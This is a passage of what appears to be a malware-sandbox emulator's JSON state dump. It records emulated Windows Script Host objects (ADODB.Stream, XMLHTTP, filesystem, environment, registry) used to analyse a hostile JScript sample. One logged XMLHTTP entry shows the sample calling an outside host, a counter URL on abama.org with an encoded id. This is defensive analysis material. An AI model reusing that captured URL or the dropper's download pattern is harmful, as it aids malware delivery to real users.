                "2745": 49,
                "2746": 49,
                "2747": 60,
                "2748": 47,
                "2749": 98,
                "2750": 62,
                "2751": 60,
                "2752": 98,
                "2753": 114,
                "2754": 62,
                "2755": 60,
                "2756": 47,
                "2757": 100,
                "2758": 105,
                "2759": 118,
                "2760": 62,
                "2761": 13,
                "2762": 10,
                "2763": 9,
                "2764": 9,
                "2765": 9,
                "2766": 9,
                "2767": 9,
                "2768": 9,
                "2769": 9,
                "2770": 9,
                "2771": 60,
                "2772": 47,
                "2773": 100,
                "2774": 105,
                "2775": 118,
                "2776": 62,
                "2777": 13,
                "2778": 10,
                "2779": 9,
                "2780": 9,
                "2781": 9,
                "2782": 9,
                "2783": 9,
                "2784": 9,
                "2785": 9,
                "2786": 60,
                "2787": 47,
                "2788": 100,
                "2789": 105,
                "2790": 118,
                "2791": 62,
                "2792": 13,
                "2793": 10,
                "2794": 9,
                "2795": 9,
                "2796": 9,
                "2797": 9,
                "2798": 9,
                "2799": 9,
                "2800": 60,
                "2801": 47,
                "2802": 100,
                "2803": 105,
                "2804": 118,
                "2805": 62,
                "2806": 13,
                "2807": 10,
                "2808": 9,
                "2809": 9,
                "2810": 9,
                "2811": 9,
                "2812": 9,
                "2813": 60,
                "2814": 47,
                "2815": 116,
                "2816": 100,
                "2817": 62,
                "2818": 13,
                "2819": 10,
                "2820": 9,
                "2821": 9,
                "2822": 9,
                "2823": 9,
                "2824": 60,
                "2825": 47,
                "2826": 116,
                "2827": 114,
                "2828": 62,
                "2829": 13,
                "2830": 10,
                "2831": 9,
                "2832": 9,
                "2833": 9,
                "2834": 60,
                "2835": 47,
                "2836": 116,
                "2837": 97,
                "2838": 98,
                "2839": 108,
                "2840": 101,
                "2841": 62,
                "2842": 13,
                "2843": 10,
                "2844": 9,
                "2845": 9,
                "2846": 60,
                "2847": 47,
                "2848": 116,
                "2849": 100,
                "2850": 62,
                "2851": 13,
                "2852": 10,
                "2853": 9,
                "2854": 60,
                "2855": 47,
                "2856": 116,
                "2857": 114,
                "2858": 62,
                "2859": 13,
                "2860": 10,
                "2861": 60,
                "2862": 47,
                "2863": 116,
                "2864": 97,
                "2865": 98,
                "2866": 108,
                "2867": 101,
                "2868": 62,
                "2869": 13,
                "2870": 10,
                "2871": 60,
                "2872": 47,
                "2873": 98,
                "2874": 111,
                "2875": 100,
                "2876": 121,
                "2877": 62,
                "2878": 13,
                "2879": 10,
                "2880": 60,
                "2881": 47,
                "2882": 104,
                "2883": 116,
                "2884": 109,
                "2885": 108,
                "2886": 62,
                "2887": 13,
                "2888": 10,
                "2889": 60,
                "2890": 33,
                "2891": 45,
                "2892": 45,
                "2893": 32,
                "2894": 75,
                "2895": 76,
                "2896": 45,
                "2897": 67,
                "2898": 70,
                "2899": 45,
                "2900": 82,
                "2901": 101,
                "2902": 115,
                "2903": 112,
                "2904": 111,
                "2905": 110,
                "2906": 115,
                "2907": 101,
                "2908": 84,
                "2909": 101,
                "2910": 109,
                "2911": 112,
                "2912": 108,
                "2913": 97,
                "2914": 116,
                "2915": 101,
                "2916": 32,
                "2917": 65,
                "2918": 110,
                "2919": 116,
                "2920": 105,
                "2921": 77,
                "2922": 97,
                "2923": 108,
                "2924": 119,
                "2925": 97,
                "2926": 114,
                "2927": 101,
                "2928": 67,
                "2929": 108,
                "2930": 111,
                "2931": 117,
                "2932": 100,
                "2933": 32,
                "2934": 45,
                "2935": 45,
                "2936": 62
            },
            "_url": "http://abama.org/counter/?id=5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55&rnd=3090343",
            "_method": "GET",
            "_async": false,
            "_readystate": 4,
            "_statustext": "OK"
        },
        {
            "id": 16,
            "_name": "ADODB_Stream[16]",
            "open": "function () {\n        util_log(this._name + \".Open()\");\n    }",
            "_type": 2,
            "_position": 0,
            "_size": 0,
            "_content": "",
            "toString": "() => {\n        return this._name /*JSON.stringify(this)*/\n    }",
            "tostring": "() => {\n        return this._name /*JSON.stringify(this)*/\n    }",
            "write": "function (a) {\n        this.content = a;\n        if (typeof a === 'undefined')\n            util_log(this._name + \".Write(undefined) - Error ?\");\n        else {\n            util_log(this._name + \".Write(str) - \" + a.length + \" bytes\");\n            this.size = a.length\n        }\n    }",
            "writetext": "function (a) {\n        var encoding = 'binary'\n        if (typeof a === 'undefined')\n            util_log(this._name + \".WriteText(undefined) - Error ?\");\n        else {\n            if (this.type == 2 && typeof this.charset !== 'undefined') {\n                this.content = _iconv.encode(a, this.charset);\n                encoding = this.charset;\n            } else {\n                this.content = a;\n            }\n            util_log(this._name + \".WriteText(str) - \" + a.length + \" bytes, encoding: \" + encoding);\n            this.size = this.content.length\n        }\n    }",
            "savetofile": "function (a, b) {\n        util_log(this._name + \".SaveToFile(\" + a + \", \" + b + \")\");\n        _wscript_saved_files[a] = this.content;\n    }",
            "saveToFile": "function (a, b) {\n        util_log(this._name + \".SaveToFile(\" + a + \", \" + b + \")\");\n        _wscript_saved_files[a] = this.content;\n    }",
            "loadfromfile": "function (a) {\n            var encoding = 'binary';\n            //util_log(this._name + \".LoadFromFile(\" + a + \")\");\n            if (this.type == 2 && typeof this.charset !== 'undefined') {\n                //util_log(\"here\");\n                this.content = _iconv.decode(Buffer.from(_wscript_saved_files[a]), this.charset);\n                encoding = this.charset;\n            } else {\n                this.content = _wscript_saved_files[a];\n            }\n            util_log(this._name + \".LoadFromFile(\" + a + \") \" + this.content.length + \" bytes, encoding: \" + encoding);\n            this.Position = 0;\n        }",
            "readtext": "function (a) {\n        util_log(this._name + \".ReadText(\" + a + \")\");\n        if (typeof a === \"undefined\" || a == adReadAll) {\n            return this.content;\n        } else if (a == adReadLine) {\n            throw new Error(\"FIXME: \" + this._name + \".ReadText(\" + a + \") not implemented.\");\n        } else if (a > 0) {\n            return this.content.slice(this.Position, this.Position + a);\n        } else {\n            return this.content;\n        }\n    }",
            "read": "function (a) {\n        util_log(this._name + \".Read(\" + a + \")\");\n        if (typeof a === \"undefined\" || a == adReadAll) {\n            return this.content;\n        } else if (a == adReadLine) {\n            throw new Error(\"FIXME: \" + this._name + \".Read(\" + a + \") not implemented.\");\n        } else if (a > 0) {\n            return this.content.slice(this.Position, this.Position + a);\n        } else {\n            return this.content;\n        }\n    }",
            "close": "function () {\n        util_log(this._name + \".Close()\");\n    }",
            "copyto": "function (t) {\n        util_log(this._name + \".CopyTo(\" + t + \")\");\n        t._type = this._type;\n        t._position = this._position;\n        t._size = this._size;\n        t._content = this._content;\n        t._charset = this._charset;\n    }"
        }
    ],
    "Date": "function Date() { [native code] }",
    "print": "function () {\n    a = _truncateOutput(Array.prototype.slice.call(arguments, 0).join(\",\"));\n    util_log(\"print(\" + a + \")\");\n}",
    "TextStream": "TextStream",
    "FileSystemObject": "FileSystemObject",
    "FS": {
        "C:": {
            "PROGRAMDATA": {},
            "PROGRAM FILES": {
                "COMMON FILES": {}
            },
            "PROGRAM FILES (X86)": {
                "COMMON FILES": {}
            },
            "USERS": {
                "USER": {
                    "APPDATA": {
                        "LOCAL": {
                            "TEMP": {}
                        },
                        "ROAMING": {},
                        "LOCALLOW": {}
                    },
                    "DESKTOP": {}
                },
                "DEFAULT": {
                    "APPDATA": {
                        "LOCAL": {
                            "TEMP": {}
                        },
                        "ROAMING": {},
                        "LOCALLOW": {}
                    },
                    "DESKTOP": {}
                },
                "PUBLIC": {
                    "APPDATA": {
                        "LOCAL": {
                            "TEMP": {}
                        },
                        "ROAMING": {},
                        "LOCALLOW": {}
                    },
                    "DESKTOP": {}
                }
            },
            "WINDOWS": {
                "SYSTEM32": {
                    "DRIVERS": {
                        "ETC": {
                            "SERVICES": "FILE CONTENT"
                        }
                    }
                }
            }
        },
        "writeFile": "function (f, c) {\n        var abs = _pw32.isAbsolute(f);\n        if (!abs)\n            util_log(\"FIXME: FS.writeFile - relative path\");\n        var parts = _pw32.normalize(f).split(_pw32.sep);\n        var t = this;\n        var path = Array.prototype.slice.call(parts, 0, -1);\n        var fname = parts[parts.length - 1];\n        util_log(\"FS.writeFile(\" + f + \", \" + _truncateOutput(c) + \")\");\n        for (let p of path) {\n            if (p === \"\")\n                continue;\n            if (!(p in t))\n                t[p] = {}\n            t = t[p.toUpperCase()];\n        }\n        t[fname.toUpperCase()] = c;\n    }"
    },
    "ENV": {
        "ALLUSERSPROFILE": "C:\\ProgramData",
        "APPDATA": "C:\\Users\\User\\AppData\\Roaming",
        "COMMONPROGRAMFILES": "C:\\Program Files\\Common Files",
        "COMMONPROGRAMFILES(X86)": "C:\\Program Files (x86)\\Common Files",
        "COMMONPROGRAMW6432": "C:\\Program Files\\Common Files",
        "COMPUTERNAME": "COMPUTER",
        "COMSPEC": "C:\\WINDOWS\\system32\\cmd.exe",
        "CWD": "C:\\Users\\User",
        "FPS_BROWSER_APP_PROFILE_STRING": "Internet Explorer",
        "FPS_BROWSER_USER_PROFILE_STRING": "Default",
        "FP_NO_HOST_CHECK": "NO",
        "HOMEDRIVE": "C:",
        "HOMEPATH": "\\Users\\User",
        "LANG": "EN",
        "LOCALAPPDATA": "C:\\Users\\User\\AppData\\Local",
        "LOGONSERVER": "\\\\COMPUTER",
        "NUMBER_OF_PROCESSORS": "4",
        "OS": "Windows_NT",
        "PATH": "C:\\Users\\User\\AppData\\Roaming\\npm;C:\\Program Files\\nodejs\\;C:\\ProgramData\\Oracle\\Java\\javapath;C:\\Program Files (x86)\\Intel\\iCLS Client\\;C:\\Program Files\\Intel\\iCLS Client\\;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Lenovo\\Fingerprint Manager Pro\\;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn\\;C:\\Program Files (x86)\\Bitvise SSH Client;C:\\Program Files\\Microsoft\\Web Platform Installer\\;C:\\Program Files (x86)\\Skype\\Phone\\;C:\\Program Files\\Intel\\WiFi\\bin\\;C:\\Program Files\\Common Files\\Intel\\WirelessCommon\\;C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\ManagementStudio\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\130\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft Emulator Manager\\1.0\\;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Program Files\\Git\\cmd;C:\\Program Files\\nodejs\\;C:\\Strawberry\\c\\bin;C:\\Strawberry\\perl\\site\\bin;C:\\Strawberry\\perl\\bin;C:\\Program Files\\TortoiseGit\\bin;C:\\Program Files\\dotnet\\;C:\\Tcl\\bin;C:\\Program Files (x86)\\Nmap;C:\\Program Files\\Intel\\WiFi\\bin\\;C:\\Program Files\\Common Files\\Intel\\WirelessCommon\\;C:\\Users\\User\\AppData\\Roaming\\npm;C:\\ProgramData\\Oracle\\Java\\javapath;C:\\Program Files (x86)\\Intel\\iCLS Client\\;C:\\Program Files\\Intel\\iCLS Client\\;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Lenovo\\Fingerprint Manager Pro\\;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\DAL;C:\\Program Files (x86)\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\Intel\\Intel(R) Management Engine Components\\IPT;C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn\\;C:\\Program Files (x86)\\Bitvise SSH Client;C:\\Program Files\\Microsoft\\Web Platform Installer\\;C:\\Program Files (x86)\\Skype\\Phone\\;C:\\Program Files\\Intel\\WiFi\\bin\\;C:\\Program Files\\Common Files\\Intel\\WirelessCommon\\;C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\ManagementStudio\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\130\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft Emulator Manager\\1.0\\;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Program Files\\Git\\cmd;C:\\Program Files\\nodejs\\;C:\\Strawberry\\c\\bin;C:\\Strawberry\\perl\\site\\bin;C:\\Strawberry\\perl\\bin;C:\\Program Files\\TortoiseGit\\bin;C:\\Program Files\\dotnet\\;C:\\Users\\User\\AppData\\Local\\Microsoft\\WindowsApps;",
        "PATHEXT": ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC",
        "PROCESSOR_ARCHITECTURE": "AMD64",
        "PROCESSOR_IDENTIFIER": "Intel64 Family 6 Model 61 Stepping 4, GenuineIntel",
        "PROCESSOR_LEVEL": "6",
        "PROCESSOR_REVISION": "3d04",
        "PROGRAMDATA": "C:\\ProgramData",
        "PROGRAMFILES": "C:\\Program Files",
        "PROGRAMFILES(X86)": "C:\\Program Files (x86)",
        "PROGRAMW6432": "C:\\Program Files",
        "PROMPT": "$P$G",
        "PSMODULEPATH": "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\PowerShell\\Modules\\;C:\\Program Files\\WindowsPowerShell\\Modules\\;C:\\Program Files (x86)\\Microsoft SDKs\\Azure\\PowerShell\\ResourceManager\\AzureResourceManager\\;C:\\Program Files (x86)\\Microsoft SDKs\\Azure\\PowerShell\\ServiceManagement\\;C:\\Program Files (x86)\\Microsoft SDKs\\Azure\\PowerShell\\Storage\\",
        "PUBLIC": "C:\\Users\\Public",
        "SESSIONNAME": "Console",
        "SYSTEMDRIVE": "C:",
        "SYSTEMROOT": "C:\\WINDOWS",
        "TEMP": "C:\\Users\\User\\AppData\\Local\\Temp",
        "TMP": "C:\\Users\\User\\AppData\\Local\\Temp",
        "USERDOMAIN": "COMPUTER",
        "USERDOMAIN_ROAMINGPROFILE": "COMPUTER",
        "USERNAME": "User",
        "USERPROFILE": "C:\\Users\\User",
        "WINDIR": "C:\\WINDOWS",
        "SYSTEMDIRECTORY": "C:\\WINDOWS\\System32"
    },
    "FolderObject": "FolderObject",
    "DriveObject": "DriveObject",
    "Folder2": "Folder2",
    "FolderItem": "FolderItem",
    "FileObject": "FileObject",
    "Collection": "Collection",
    "lcname": "createobject",
    "Enumerator": "Enumerator",
    "WshArguments": "WshArguments",
    "WScript": "Windows Script Host",
    "create_object": "create_object",
    "GetObject": "GetObject",
    "WSH": {
        "$ref": "$[\"WScript\"]"
    },
    "AutomationObject": "AutomationObject",
    "MSScriptControl_ScriptControl": "MSScriptControl_ScriptControl",
    "Scripting_Dictionary": "Scripting_Dictionary",
    "ActiveXObject": "ActiveXObject",
    "Shell_Application": "Shell_Application",
    "Process": "Process",
    "REG": {
        "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\PRODUCTID": "00330-80000-00000-AA676",
        "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\SYSTEMROOT": "c:\\WINDOWS",
        "HKLM\\SOFTWARE\\CLASSES\\MIME\\DATABASE\\RFC1766\\1034": "en-us;@%SystemRoot%system32mlang.dll,-4386",
        "HKLM\\SOFTWARE\\CLASSES\\MIME\\DATABASE\\RFC1766\\0409": "en-us;@%SystemRoot%system32mlang.dll,-4386",
        "HKCR\\HTTP\\SHELL\\OPEN\\COMMAND\\": "\"C:\\Chrome\\chrome.exe\" -url \"%1\"",
        "eee": ""
    },
    "WScript_Shell": "WScript_Shell",
    "Shell": "WScript_Shell",
    "WScript_Network": "WScript_Network",
    "VBScript_RegExp": "VBScript_RegExp",
    "WshEnvironment": "WshEnvironment",
    "WshShortcut": "WshShortcut",
    "ADODB_Stream": "function () {\n    this.id = _object_id++;\n    this._name = \"ADODB_Stream[\" + this.id + \"]\";\n    util_log(\"new \" + this._name);\n\n    //_trace(\"ADOBE\");\n\n    this.open = function() {\n        util_log(this._name + \".Open()\");\n    }\n    this._type = 2;\n    this._position = 0;\n    this._size = 0;\n    this._content = '';\n    this._charset = undefined;\n    this.tostring = this.toString = () => {\n        return this._name /*JSON.stringify(this)*/\n    }\n\n    this.write = function(a) {\n        this.content = a;\n        if (typeof a === 'undefined')\n            util_log(this._name + \".Write(undefined) - Error ?\");\n        else {\n            util_log(this._name + \".Write(str) - \" + a.length + \" bytes\");\n            this.size = a.length\n        }\n    }\n    this.writetext = function(a) {\n        var encoding = 'binary'\n        if (typeof a === 'undefined')\n            util_log(this._name + \".WriteText(undefined) - Error ?\");\n        else {\n            if (this.type == 2 && typeof this.charset !== 'undefined') {\n                this.content = _iconv.encode(a, this.charset);\n                encoding = this.charset;\n            } else {\n                this.content = a;\n            }\n            util_log(this._name + \".WriteText(str) - \" + a.length + \" bytes, encoding: \" + encoding);\n            this.size = this.content.length\n        }\n    }\n    this.savetofile = function(a, b) {\n        util_log(this._name + \".SaveToFile(\" + a + \", \" + b + \")\");\n        _wscript_saved_files[a] = this.content;\n    }\n    this.saveToFile = this.savetofile;\n\n    this.loadfromfile = function(a) {\n            var encoding = 'binary';\n            //util_log(this._name + \".LoadFromFile(\" + a + \")\");\n            if (this.type == 2 && typeof this.charset !== 'undefined') {\n                //util_log(\"here\");\n                this.content = _iconv.decode(Buffer.from(_wscript_saved_files[a]), this.charset);\n                encoding = this.charset;\n            } else {\n                this.content = _wscript_saved_files[a];\n            }\n            util_log(this._name + \".LoadFromFile(\" + a + \") \" + this.content.length + \" bytes, encoding: \" + encoding);\n            this.Position = 0;\n        }\n        // adReadAll -1 Default. Reads all bytes from the stream, from the current position onwards to the EOS marker.\n        // This is the only valid StreamReadEnum value with binary streams (Type is adTypeBinary).\n        // adReadLine -2 Reads the next line from the stream (designated by the LineSeparator property).\n    this.readtext = function(a) {\n        util_log(this._name + \".ReadText(\" + a + \")\");\n        if (typeof a === \"undefined\" || a == adReadAll) {\n            return this.content;\n        } else if (a == adReadLine) {\n            throw new Error(\"FIXME: \" + this._name + \".ReadText(\" + a + \") not implemented.\");\n        } else if (a > 0) {\n            return this.content.slice(this.Position, this.Position + a);\n        } else {\n            return this.content;\n        }\n    }\n    this.read = function(a) {\n        util_log(this._name + \".Read(\" + a + \")\");\n        if (typeof a === \"undefined\" || a == adReadAll) {\n            return this.content;\n        } else if (a == adReadLine) {\n            throw new Error(\"FIXME: \" + this._name + \".Read(\" + a + \") not implemented.\");\n        } else if (a > 0) {\n            return this.content.slice(this.Position, this.Position + a);\n        } else {\n            return this.content;\n        }\n    }\n    this.close = function() {\n        util_log(this._name + \".Close()\");\n    }\n    this.copyto = function(t) {\n        util_log(this._name + \".CopyTo(\" + t + \")\");\n        t._type = this._type;\n        t._position = this._position;\n        t._size = this._size;\n        t._content = this._content;\n        t._charset = this._charset;\n    }\n    _defineSingleProperty(this, \"charset\", \"_charset\");\n    //_defineSingleProperty(this, \"readtext\", \"_content\");\n    //_defineSingleProperty(this, \"read\", \"_content\");\n    _defineSingleProperty(this, \"content\", \"_content\");\n    // adTypeBinary 1 Indicates binary data.\n    // adTypeText 2 Default. Indicates text data, which is in the character set specified by Charset.\n    _defineSingleProperty(this, \"type\", \"_type\");\n    _defineSingleProperty(this, \"position\", \"_position\");\n    _defineSingleProperty(this, \"size\", \"_size\");\n}",
    "ADODB_Recordset": "ADODB_Recordset",
    "Msxml2_DOMDocument_6_0": "Msxml2_DOMDocument_6_0",
    "MSXML2_XMLHTTP": "MSXML2_XMLHTTP",
    "Style": "Style",
    "Node": "Node",
    "Element": "Element",
    "HTMLElement": "HTMLElement",
    "HTMLIFrameElement": "HTMLIFrameElement",
    "_browser_documents": [],
    "location": {
        "_name": "location",
        "_props": {
            "href": "http://example.com/?search",
            "hostname": "example.com",
            "search": "?search",
            "host": "example.com"
        },
        "replace": "function (n) {\n        util_log(this._name + \".replace(\" + n + \")\");\n        this._props[\"href\"] = n;\n    }",
        "toString": "() => { return \"location\" }"
    },
    "k": "vendor",
    "screen": {
        "availHeight": 1080,
        "availLeft": 78,
        "availTop": 0,
        "availWidth": 1842,
        "colorDepth": 24,
        "height": 1080,
        "orientation": {
            "angle": 0,
            "onchange": null,
            "type": "landscape-primary"
        },
        "pixelDepth": 24,
        "width": 1920,
        "toString": "() => { return \"screen\" }"
    },
    "_setInterval_calls": [],
    "_setTimeout_calls": [],
    "window": {
        "id": 5,
        "_name": "window[5]",
        "eval": "function eval(s) { /* [native code ] */ return _(s)}",
        "settimeout": "function () {\n        util_log(this._name + \".setTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setTimeout_calls[_setTimeout_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return _setTimeout.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
        "cleartimeout": "function () {\n        util_log(this._name + \".clearTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _clearTimeout.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
        "scrollby": "function (x, y) {\n        util_log(this._name + \".scrollBy(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n    }",
        "setinterval": "function () {\n        util_log(this._name + \".setInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setInterval_calls[_setInterval_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return _setInterval.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
        "clearinterval": "function () {\n        util_log(this._name + \".clearInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _clearInterval.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
        "settimeoutsync": "function () {\n        util_log(this._name + \".setTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setTimeout_calls[_setTimeout_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return arguments[0].apply(this, Array.prototype.slice.call(arguments, 1));\n    }",
        "setintervalsync": "function () {\n        util_log(this._name + \".setInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setInterval_calls[_setInterval_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return arguments[0].apply(this, Array.prototype.slice.call(arguments, 1));\n    }",
        "clearintervalsync": "function () {\n        util_log(this._name + \".clearInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n    }",
        "navigator": {
            "id": 5,
            "_name": "window[5]",
            "eval": "function eval(s) { /* [native code ] */ return _(s)}",
            "settimeout": "function () {\n        util_log(this._name + \".setTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setTimeout_calls[_setTimeout_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return _setTimeout.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
            "cleartimeout": "function () {\n        util_log(this._name + \".clearTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _clearTimeout.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
            "scrollby": "function (x, y) {\n        util_log(this._name + \".scrollBy(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n    }",
            "setinterval": "function () {\n        util_log(this._name + \".setInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setInterval_calls[_setInterval_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return _setInterval.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
            "clearinterval": "function () {\n        util_log(this._name + \".clearInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _clearInterval.apply(this, Array.prototype.slice.call(arguments, 0));\n    }",
            "settimeoutsync": "function () {\n        util_log(this._name + \".setTimeout(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setTimeout_calls[_setTimeout_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return arguments[0].apply(this, Array.prototype.slice.call(arguments, 1));\n    }",
            "setintervalsync": "function () {\n        util_log(this._name + \".setInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n        _setInterval_calls[_setInterval_calls.length] = arguments[0].toString();\n        //util_log(typeof arguments[0]);\n        return arguments[0].apply(this, Array.prototype.slice.call(arguments, 1));\n    }",
            "clearintervalsync": "function () {\n        util_log(this._name + \".clearInterval(\" + Array.prototype.slice.call(arguments, 0).join(\",\") + \")\");\n    }",
            "navigator": {
                "$ref": "$[\"window\"][\"navigator\"]"
            },
            "_location": {
                "$ref": "$[\"location\"]"
            },
            "toString": "() => { return \"window\" }",
            "Array": "function Array() { [native code] }",
            "Boolean": "function Boolean() { [native code] }",
            "Date": "function Date() { [native code] }",
            "Error": "function Error() { [native code] }",
            "Math": {},
            "Number": "function Number() { [native code] }",
            "Object": "function Object() { [native code] }",
            "RegExp": "function RegExp() { [native code] }",
            "String": "function String() { [native code] }",
            "Node": "Node",
            "JSON": {
                "decycle": "function decycle(object) {\n        'use strict';\n        \n        // Make a deep copy of an object or array, assuring that there is at most\n        // one instance of each object or array in the resulting structure. The\n        // duplicate references (which might be forming cycles) are replaced with\n        // an object of the form\n        //      {$ref: PATH}\n        // where the PATH is a JSONPath string that locates the first occurance.\n        // So,\n        //      var a = [];\n        //      a[0] = a;\n        //      return JSON.stringify(JSON.decycle(a));\n        // produces the string '[{\"$ref\":\"$\"}]'.\n        \n        // JSONPath is used to locate the unique object. $ indicates the top level of\n        // the object or array. [NUMBER] or [STRING] indicates a child member or\n        // property.\n        \n        var objects = [],   // Keep a reference to each unique object or array\n            paths = [];     // Keep the path to each unique object or array\n        \n        return (function derez(value, path) {\n            \n            // The derez recurses through the object, producing the deep copy.\n            \n            var i,          // The loop counter\n                name,       // Property name\n                nu;         // The new object or array\n            \n            // typeof null === 'object', so go on if this value is really an object but not\n            // one of the weird builtin objects.\n            \n            if (typeof value === 'object' && value !== null &&\n                    !(value instanceof Boolean) &&\n                    !(value instanceof Date) &&\n                    !(value instanceof Number) &&\n                    !(value instanceof RegExp) &&\n                    !(value instanceof String)) {\n                \n                // If the value is an object or array, look to see if we have already\n                // encountered it. If so, return a $ref/path object. This is a hard way,\n                // linear search that will get slower as the number of unique objects grows.\n                \n                for (i = 0; i < objects.length; i += 1) {\n                    if (objects[i] === value) {\n                        return { $ref: paths[i] };\n                    }\n                }\n                \n                // Otherwise, accumulate the unique value and its path.\n                \n                objects.push(value);\n                paths.push(path);\n                \n                // If it is an array, replicate the array.\n                \n                if (Object.prototype.toString.apply(value) === '[object Array]') {\n                    nu = [];\n                    for (i = 0; i < value.length; i += 1) {\n                        nu[i] = derez(value[i], path + '[' + i + ']');\n                    }\n                } else {\n                    \n                    // If it is an object, replicate the object.\n                    \n                    nu = {};\n                    for (name in value) {\n                        if (Object.prototype.hasOwnProperty.call(value, name)) {\n                            nu[name] = derez(value[name],\n                                    path + '[' + JSON.stringify(name) + ']');\n                        }\n                    }\n                }\n                return nu;\n            }\n            return value;\n        }(object, '$'));\n    }",
                "retrocycle": "function retrocycle($) {\n        'use strict';\n        \n        // Restore an object that was reduced by decycle. Members whose values are\n        // objects of the form\n        //      {$ref: PATH}\n        // are replaced with references to the value found by the PATH. This will\n        // restore cycles. The object will be mutated.\n        \n        // The eval function is used to locate the values described by a PATH. The\n        // root object is kept in a $ variable. A regular expression is used to\n        // assure that the PATH is extremely well formed. The regexp contains nested\n        // * quantifiers. That has been known to have extremely bad performance\n        // problems on some browsers for very long strings. A PATH is expected to be\n        // reasonably short. A PATH is allowed to belong to a very restricted subset of\n        // Goessner's JSONPath.\n        \n        // So,\n        //      var s = '[{\"$ref\":\"$\"}]';\n        //      return JSON.retrocycle(JSON.parse(s));\n        // produces an array containing a single element which is the array itself.\n        \n        var px = /^\\$(?:\\[(?:\\d+|\\\"(?:[^\\\\\\\"\\u0000-\\u001f]|\\\\([\\\\\\\"\\/bfnrt]|u[0-9a-zA-Z]{4}))*\\\")\\])*$/;\n        \n        (function rez(value) {\n            \n            // The rez function walks recursively through the object looking for $ref\n            // properties. When it finds one that has a value that is a path, then it\n            // replaces the $ref object with a reference to the value that is found by\n            // the path.\n            \n            var i, item, name, path;\n            \n            if (value && typeof value === 'object') {\n                if (Object.prototype.toString.apply(value) === '[object Array]') {\n                    for (i = 0; i < value.length; i += 1) {\n                        item = value[i];\n                        if (item && typeof item === 'object') 